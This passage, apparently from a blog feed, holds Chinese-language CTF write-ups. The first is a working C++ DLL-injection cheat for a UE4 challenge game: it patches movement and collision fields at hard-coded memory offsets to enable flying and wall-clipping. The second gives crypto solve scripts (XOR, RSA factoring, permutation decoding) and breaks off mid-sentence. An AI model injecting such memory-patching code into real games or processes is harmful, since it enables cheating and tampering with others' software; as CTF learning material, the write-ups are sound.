OFFSET_UCHARMOVEMENT_LASTUPDATEVELO = <span class="number">0x25C</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UPRIMITIVE_BODYINSTANCE = <span class="number">0x2C8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_FBODYINSTANCE_COLLISIONENABLED = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_userFly&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_autoFlyFromCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_noCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_MOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCapsuleComponent* <span class="title">GetCapsuleComponent</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCapsuleComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CAPSULE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLand = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunch = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCH);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Flying;</span><br><span class="line">        <span class="keyword">if</span> (giveBoost) &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (giveBoost &amp;&amp; lastUpdateVel.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVel.Z = <span class="number">400.f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyCollisionState</span><span class="params">(UCapsuleComponent* capsule, <span class="type">bool</span> noCollision)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!capsule) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* primitive = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(capsule);</span><br><span class="line">    <span class="keyword">auto</span>&amp; collisionEnabled = *<span class="built_in">reinterpret_cast</span>&lt;ECollisionEnabled*&gt;(</span><br><span class="line">        primitive + OFFSET_UPRIMITIVE_BODYINSTANCE + OFFSET_FBODYINSTANCE_COLLISIONENABLED);</span><br><span class="line"></span><br><span class="line">    collisionEnabled = noCollision ? ECollisionEnabled::NoCollision</span><br><span class="line">        : ECollisionEnabled::QueryAndPhysics;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ShouldFly</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> g_userFly.<span class="built_in">load</span>() || g_autoFlyFromCollision.<span class="built_in">load</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            g_userFly = !g_userFly.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F5) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement || !capsule) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">bool</span> newState = !g_noCollision.<span class="built_in">load</span>();</span><br><span class="line">            g_noCollision = newState;</span><br><span class="line">            g_autoFlyFromCollision = newState;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ApplyCollisionState</span>(capsule, newState);</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；</span></span><br><span class="line"><span class="comment">            如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement/ Capsule，</span></span><br><span class="line"><span class="comment">            能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ShouldFly</span>() || g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character)) &#123;</span><br><span class="line">                            <span class="built_in">SustainFly</span>(movement, g_userFly.<span class="built_in">load</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character); g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">                            <span class="built_in">ApplyCollisionState</span>(capsule, <span class="literal">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式\nF5 切换穿墙模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Flag：TSCTF-J{u0real_or_R1AL?!</p><p>还有一段flag找不到</p><p>只能看wp了</p><p>看了题解是藏在前面了_and_here}</p><p>TSCTF-J{u0real_or_R1AL?!_and_here}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UE4逆向初探-OverWatch&quot;&gt;&lt;a href=&quot;#UE4逆向初探-OverWatch&quot; class=&quot;headerlink&quot; title=&quot;UE4逆向初探-OverWatch&quot;&gt;&lt;/a&gt;UE4逆向初探-OverWatch&lt;/h1&gt;&lt;p&gt;可以看这个&lt;a hr</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>TSCTF-J 2025 wp</title>
    <link href="http://matriy330.github.io/ae56c8ab/"/>
    <id>http://matriy330.github.io/ae56c8ab/</id>
    <published>2025-10-13T15:00:00.000Z</published>
    <updated>2025-10-14T15:06:38.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TSCTF-J-2025-wp"><a href="#TSCTF-J-2025-wp" class="headerlink" title="TSCTF-J 2025 wp"></a>TSCTF-J 2025 wp</h1><p>本次TSCTF-J，共解出27道题，逆向差两道AK，主RE赛道 先做的题后补的wp，因此写的可能有点屎，wp后面会在博客更新完善[RE部分]</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013095822927.png" alt="image-20251013095822927"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign in"></a>sign in</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">KEY1 = a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93</span><br><span class="line">KEY2 ^ KEY1 = b38dc315bb7c75e3c9fa84f123898ff684fd36189e83c422cf0d2804c12b4c83</span><br><span class="line">KEY2 ^ KEY3 = 11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f</span><br><span class="line">FLAG ^ KEY1 ^ KEY2 ^ KEY3 = e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121</span><br></pre></td></tr></table></figure><p>F ^ K1 ^ K2 ^ K3 &#x3D; X</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">K1 = <span class="built_in">int</span>(<span class="string">&#x27;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">K2_xor_K1 = <span class="built_in">int</span>(<span class="string">&#x27;b38dc315bb7c75e3c9fa84f123898ff684fd36189e83c422cf0d2804c12b4c83&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">K2_xor_K3 = <span class="built_in">int</span>(<span class="string">&#x27;11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">F_xor_all = <span class="built_in">int</span>(<span class="string">&#x27;e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">K2 = K2_xor_K1 ^ K1</span><br><span class="line">K3 = K2 ^ K2_xor_K3</span><br><span class="line">F = F_xor_all ^ K1 ^ K2 ^ K3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag_bytes = F.to_bytes((F.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_bytes = flag_bytes.rjust(<span class="number">48</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">flag = base64.b64decode(flag_bytes)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>TSCTF-J{I_like_Crypto}</p><h3 id="p-q"><a href="#p-q" class="headerlink" title="p&#x3D;~q"></a>p&#x3D;~q</h3><p>可以利用 p 和 q 之间的关系来分解 n。具体来说，p 和 q 是通过将随机生成的比特串取反后生成的，因此存在数学关系。通过这种关系，我们可以将 n 表示为关于变量 C 的二次方程，并求解 C 从而得到 p 和 q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543</span></span><br><span class="line">c = <span class="number">6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">A = <span class="number">2</span>**<span class="number">1023</span></span><br><span class="line">D = <span class="number">9</span> * A * A - <span class="number">4</span> * n</span><br><span class="line">root = math.isqrt(D)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> root * root == D:</span><br><span class="line">    C1 = (A - root) // <span class="number">2</span></span><br><span class="line">    p1 = A + C1</span><br><span class="line">    q1 = <span class="number">2</span> * A - C1</span><br><span class="line">    <span class="keyword">if</span> p1 * q1 == n:</span><br><span class="line">        p, q = p1, q1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        C2 = (A + root) // <span class="number">2</span></span><br><span class="line">        p2 = A + C2</span><br><span class="line">        q2 = <span class="number">2</span> * A - C2</span><br><span class="line">        <span class="keyword">if</span> p2 * q2 == n:</span><br><span class="line">            p, q = p2, q2</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;无法分解 n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;D 不是完全平方数&quot;</span>)</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>TSCTF-J{The_easiest_RSA_key!}</p><h3 id="Cantor’s-gifts"><a href="#Cantor’s-gifts" class="headerlink" title="Cantor’s gifts"></a>Cantor’s gifts</h3><p> 排列编码逆运算题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"></span><br><span class="line">X = <span class="number">2498752981111460725490082182453813672840574</span></span><br><span class="line">now_message = <span class="string">b&#x27;5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t&#x27;</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(now_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) turn X into Lehmer digits</span></span><br><span class="line">a = []</span><br><span class="line">rem = X</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    f = factorial(n - i - <span class="number">1</span>)</span><br><span class="line">    a_i = rem // f</span><br><span class="line">    a.append(a_i)</span><br><span class="line">    rem = rem % f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) Lehmer -&gt; permutation (values 1..n)</span></span><br><span class="line">available = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>))</span><br><span class="line">reflection = []</span><br><span class="line"><span class="keyword">for</span> a_i <span class="keyword">in</span> a:</span><br><span class="line">    reflection.append(available.pop(a_i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) undo permutation: now_message[k] = message[reflection[k]-1]</span></span><br><span class="line">msg = [<span class="literal">None</span>] * n</span><br><span class="line"><span class="keyword">for</span> k, r <span class="keyword">in</span> <span class="built_in">enumerate</span>(reflection):</span><br><span class="line">    msg[r-<span class="number">1</span>] = now_message[k:k+<span class="number">1</span>]  <span class="comment"># single byte</span></span><br><span class="line">message = <span class="string">b&#x27;&#x27;</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;message =&quot;</span>, message.decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>, <span class="string">b&quot;TSCTF-J&#123;&quot;</span> + message + <span class="string">b&quot;&#125;&quot;</span>.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013100932768.png" alt="image-20251013100932768"></p><h3 id="野狐禅"><a href="#野狐禅" class="headerlink" title="野狐禅"></a>野狐禅</h3><p>题目给的 Paillier 密文里写入随机数是用 LCG 生成的，而且原始 LCG 输出值也附在文件里；利用这些值，可以把 Paillier 的随机掩码去掉，直接还原出 150 个明文序列项 y。</p><p>y 实际上是一个线性递推序列，前 75 项就是 flag 按三进制拆分后的系数，后 75 项是用这些系数递推出来的结果。把递推方程在模一个大素数下写成线性方程组，就可以通过高斯消元解出 75 